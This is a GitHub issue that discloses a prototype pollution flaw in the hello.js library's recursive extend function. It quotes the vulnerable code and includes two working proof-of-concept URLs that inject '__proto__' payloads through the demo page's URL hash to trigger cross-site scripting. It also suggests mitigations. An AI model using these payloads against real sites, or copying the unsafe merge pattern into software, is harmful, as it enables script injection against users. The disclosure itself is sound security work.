### **[martinzhou2015](/martinzhou2015)** commented [Jan 28, 2021](#issue-795772113)

| Abstract The function `hello.utils.extend`, defined in file `hello.js`, introduces a Prototype Pollution vulnerability, which could result in Cross-Site Scripting.     [hello.js/src/hello.js](https://github.com/MrSwitch/hello.js/blob/f41fa67e59eeab692a028ba8b151de8b5dd401cb/src/hello.js#L17-L45)  Lines 17 to 45 in [f41fa67](/MrSwitch/hello.js/commit/f41fa67e59eeab692a028ba8b151de8b5dd401cb)   |  | hello.utils = { | | --- | --- | |  |  | |  | // Extend the first object with the properties and methods of the second | |  | extend: function(r /\*, a[, b[, ...]] \*/) { | |  |  | |  | // Get the arguments as an array but ommit the initial item | |  | Array.prototype.slice.call(arguments, 1).forEach(function(a) { | |  | if (Array.isArray(r) && Array.isArray(a)) { | |  | Array.prototype.push.apply(r, a); | |  | } | |  | else if (r && (r instanceof Object || typeof r === 'object') && a && (a instanceof Object || typeof a === 'object') && r !== a) { | |  | for (var x in a) { | |  | r[x] = hello.utils.extend(r[x], a[x]); | |  | } | |  | } | |  | else { | |  |  | |  | if (Array.isArray(a)) { | |  | // Clone it | |  | a = a.slice(0); | |  | } | |  |  | |  | r = a; | |  | } | |  | }); | |  |  | |  | return r; | |  | } | |  | }; |      The code on Line 29 has a typical pattern of Prototype Pollution.  ``` r[x] = hello.utils.extend(r[x], a[x]);  ```  The vulnerable lines of code, then, are called on Line 1320, which could allow attackers to pollute the object in JavaScript.   [hello.js/src/hello.js](https://github.com/MrSwitch/hello.js/blob/f41fa67e59eeab692a028ba8b151de8b5dd401cb/src/hello.js#L1320)  Line 1320 in [f41fa67](/MrSwitch/hello.js/commit/f41fa67e59eeab692a028ba8b151de8b5dd401cb)   |  | p = \_this.merge(\_this.param(location.search || ''), \_this.param(location.hash || '')); | | --- | --- |     Proof of Concepts As a result, websites, which use the `hello.js`, might highly likely have Cross-Site Scripting. Take the offical demo of `hello.js` as an example, the Prototype Pollution could be exploited as follows:  [https://adodson.com/hello.js/demos/events.html#state={%22a%22:%221%22,%22\_\_proto\_\_%22:{%22callback%22:%22alert%22}}](https://adodson.com/hello.js/demos/events.html#state=%7B%22a%22:%221%22,%22__proto__%22:%7B%22callback%22:%22alert%22%7D%7D) [https://adodson.com/hello.js/demos/events.html#state={%22a%22:%221%22,%22\_\_proto\_\_%22:{%22onbeforescriptexecute%22:%22alert(location.href)%22}}](https://adodson.com/hello.js/demos/events.html#state=%7B%22a%22:%221%22,%22__proto__%22:%7B%22onbeforescriptexecute%22:%22alert(location.href)%22%7D%7D) [proof](https://user-images.githubusercontent.com/13579581/106107916-7f0af780-6182-11eb-85f3-1e78818731e5.png) Suggestion  * Freeze the prototype‚Äî use Object.freeze (Object.prototype). * Require schema validation of JSON input. * Avoid using unsafe recursive merge functions. * Consider using objects without prototypes (for example, Object.create(null)), breaking the prototype chain and preventing pollution. * As a best practice use Map instead of Object. |
